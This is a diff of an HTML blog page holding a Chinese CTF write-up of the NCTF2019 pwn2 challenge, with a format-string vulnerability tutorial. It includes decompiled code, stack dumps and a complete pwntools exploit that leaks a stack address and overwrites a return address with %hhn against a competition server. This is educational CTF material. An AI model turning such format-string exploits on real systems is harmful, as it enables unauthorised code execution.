@@ -25,7 +25,7 @@
     <meta name="description" content="Blog">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>NCTF_pwn2心得 &amp; 格式化字符串总结 · mrh929&#39;s Studio</title>
+    <title>NCTF2019_pwn2心得 &amp; 格式化字符串总结 · mrh929&#39;s Studio</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -235,7 +235,7 @@
                 <a href="/">初音ミクの消失</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">NCTF_pwn2心得 & 格式化字符串总结</a>
+                <a href="#" class="post-name">NCTF2019_pwn2心得 & 格式化字符串总结</a>
             </div>
     </div>
     
@@ -265,7 +265,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            NCTF_pwn2心得 & 格式化字符串总结
+            NCTF2019_pwn2心得 & 格式化字符串总结
             <!-- 404 -->
             
         </h1>
@@ -290,7 +290,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">1.3k</span>阅读时长: <span class="post-count reading-time">5 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">1.4k</span>阅读时长: <span class="post-count reading-time">5 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -419,14 +419,14 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>字符串泄露，顾名思义，就是利用一串格式化字符串，来达到泄露程序数据、修改内存数据的目的。</p>
-<h3 id="一个例子"><a href="#一个例子" class="headerlink" title="一个例子"></a>一个例子</h3><p>@NCTF2019 pwn2</p>
+        <h1 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><p>字符串泄露，顾名思义，就是利用一串格式化字符串，来达到泄露程序数据、修改内存数据的目的。</p>
+<h2 id="一个例子"><a href="#一个例子" class="headerlink" title="一个例子"></a>一个例子</h2><p>@NCTF2019 pwn2</p>
 <p> <a href="\uploads\nctf2019_pwn2.7z">nctf2019_pwn2.7z</a> </p>
-<p>让我们来总览一下程序</p>
+<h3 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h3><p>让我们来总览一下程序</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ubuntu:~/Desktop/<span class="built_in">test</span><span class="comment"># checksec pwn_me_2 </span></span><br><span class="line">[*] <span class="string">'/home/mrh929/Desktop/test/pwn_me_2'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
 
 <p>保护全开，尤其是地址随机化，让我们不能定位到代码段的具体位置</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  initialize();</span><br><span class="line">  input_name();</span><br><span class="line">  memcpy_and_printf();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"pwn me 100 years again,please!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"are you ready?"</span>);</span><br><span class="line">  read_and_printf();</span><br><span class="line">  <span class="keyword">if</span> ( dword_55BA09B090E0 != <span class="number">0x66666666</span> )</span><br><span class="line">    failed();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"enjoy the fun of pwn"</span>);</span><br><span class="line">  getshell();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="泄漏点分析"><a href="#泄漏点分析" class="headerlink" title="泄漏点分析"></a>泄漏点分析</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  initialize();</span><br><span class="line">  input_name();</span><br><span class="line">  memcpy_and_printf();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"pwn me 100 years again,please!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"are you ready?"</span>);</span><br><span class="line">  read_and_printf();</span><br><span class="line">  <span class="keyword">if</span> ( dword_55BA09B090E0 != <span class="number">0x66666666</span> )</span><br><span class="line">    failed();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"enjoy the fun of pwn"</span>);</span><br><span class="line">  getshell();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>主要关注和read与printf有关的函数。</p>
 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">input_name</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"welcome to play nctf!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"a little different,have fun."</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"but your name:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -454,12 +454,12 @@ height:50vh;
 <p>00007FFFA44EFD50  00007FFFA44EFD60  [stack]:00007FFFA44EFD60</p>
 </blockquote>
 <p>这是一个指向栈中的指针，我们可以通过格式化字符串将其所指向的地址泄露</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">16</span> + <span class="string">"%14$lld"</span> </span><br><span class="line"><span class="comment">#注意这是64位程序，函数指针长达8个字节，必须通过%lld泄露</span></span><br><span class="line"><span class="comment">#前16个字节会被src，问题不大</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">'..\n'</span>)</span><br><span class="line"></span><br><span class="line">stack_addr = int(p.recv(<span class="number">15</span>))</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">16</span> + <span class="string">"%14$lld"</span> </span><br><span class="line"><span class="comment">#注意这是64位程序，函数指针长达8个字节，必须通过%lld泄露</span></span><br><span class="line"><span class="comment">#前16个字节会被src覆盖，问题不大</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">'..\n'</span>)</span><br><span class="line"></span><br><span class="line">stack_addr = int(p.recv(<span class="number">15</span>))</span><br></pre></td></tr></table></figure>
 
 <p>为什么要泄露这个栈中的地址呢？是因为我们发现通过这几个有限的泄露点是不能进行栈溢出的，因为 canary 和动态地址两者 <strong>只能知道其一</strong> 。</p>
 <p>只有通过格式化字符串的方式在第二个泄漏点改变栈中的函数返回地址，从而让程序直接跳过检验内存数据是否为 0x66666666 的过程。</p>
 <p>继续调试，下断点在下一个 printf 函数  ，查看系统栈</p>
-<p><strong>由于不方便调试，我调试了多次，地址有所变化，不影响观察</strong></p>
+<p><strong>由于不方便调试，我调试了多次，动态地址有所变化，不过不影响观察</strong></p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">00007FFD56761AB8  000055607F0F1C31  read_and_printf+5B</span><br><span class="line">00007FFD56761AC0  000A303030303030  </span><br><span class="line">00007FFD56761AC8  00007FA8E673781B  libc_2.23.so:_IO_file_overflow+EB</span><br><span class="line">00007FFD56761AD0  000000000000000E  </span><br><span class="line">00007FFD56761AD8  00007FA8E6A82620  libc_2.23.so:_IO_2_1_stdout_</span><br><span class="line">00007FFD56761AE0  000055607F0F1E7F  .rodata:aAreYouReady</span><br><span class="line">00007FFD56761AE8  00007FA8E672C7FA  libc_2.23.so:puts+16A</span><br><span class="line">00007FFD56761AF0  0000000000000000  </span><br><span class="line">00007FFD56761AF8  C275F8AAB68E9400  </span><br><span class="line">00007FFD56761B00  00007FFD56761B10  [stack]:00007FFD56761B10</span><br><span class="line">00007FFD56761B08  000055607F0F1CEF  main+44</span><br><span class="line">00007FFD56761B10  000055607F0F1D30  init</span><br><span class="line">00007FFD56761B18  00007FA8E66DD830  libc_2.23.so:__libc_start_main+F0</span><br></pre></td></tr></table></figure>
 
 <p>第二行 *<em>00007FFD56761AC0 *</em> 00 0A 30 30 30 30 30 30 是我输入的数据，直接出现在栈里面了，可以直接通过格式化字符串作为修改内存的一个参数</p>
@@ -484,7 +484,7 @@ height:50vh;
 </ol>
 <p>n 代表将前一个格式化字符串所输出的字节数量存入对应的地址中</p>
 <p>补充5个padding的目的是对齐栈，使注入的数据位置正确。</p>
-<blockquote>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><blockquote>
 <p>完整 exp</p>
 </blockquote>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">"DEBUG"</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'139.129.76.65'</span>,<span class="number">50005</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process('./pwn_me_2')</span></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">16</span> + <span class="string">"%14$lld"</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">'..\n'</span>)</span><br><span class="line"></span><br><span class="line">stack_addr = int(p.recv(<span class="number">15</span>))</span><br><span class="line">success(hex(stack_addr))</span><br><span class="line"><span class="comment"># 0x7ffd3ff3e9c0, the addr of stack</span></span><br><span class="line"></span><br><span class="line">stack_addr -= <span class="number">8</span></span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">"%250d%8$hhn"</span> + <span class="string">'k'</span>*<span class="number">5</span> + p64(stack_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
@@ -497,7 +497,7 @@ height:50vh;
             <p>原文作者：<a href="https://mrh1s.top">mrh929</a>
             </p><p>原文链接：<a href="https://mrh1s.top/posts/44593ed6/">https://mrh1s.top/posts/44593ed6/</a>
             </p><p>发表日期：<a href="https://mrh1s.top/posts/44593ed6/">November 26th 2019, 8:57:45 am</a>
-            </p><p>更新日期：<a href="https://mrh1s.top/posts/44593ed6/">November 26th 2019, 9:58:59 am</a>
+            </p><p>更新日期：<a href="https://mrh1s.top/posts/44593ed6/">November 26th 2019, 10:13:31 am</a>
             </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -626,7 +626,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#格式化字符串"><span class="toc-number">1.</span> <span class="toc-text">格式化字符串</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#简介"><span class="toc-number">1.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#一个例子"><span class="toc-number">1.2.</span> <span class="toc-text">一个例子</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#格式化字符串"><span class="toc-number">1.</span> <span class="toc-text">格式化字符串</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#简介"><span class="toc-number">1.1.</span> <span class="toc-text">简介</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#简介-1"><span class="toc-number">1.1.1.</span> <span class="toc-text">简介</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#一个例子"><span class="toc-number">1.2.</span> <span class="toc-text">一个例子</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#概览"><span class="toc-number">1.2.1.</span> <span class="toc-text">概览</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#泄漏点分析"><span class="toc-number">1.2.2.</span> <span class="toc-text">泄漏点分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">1.2.3.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -1719,7 +1719,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/26</span><a class="archive-post-title" href="/posts/44593ed6/">NCTF_pwn2心得 & 格式化字符串总结</a>
+            <span class="archive-post-date">11/26</span><a class="archive-post-title" href="/posts/44593ed6/">NCTF2019_pwn2心得 & 格式化字符串总结</a>
         </li>
     
     
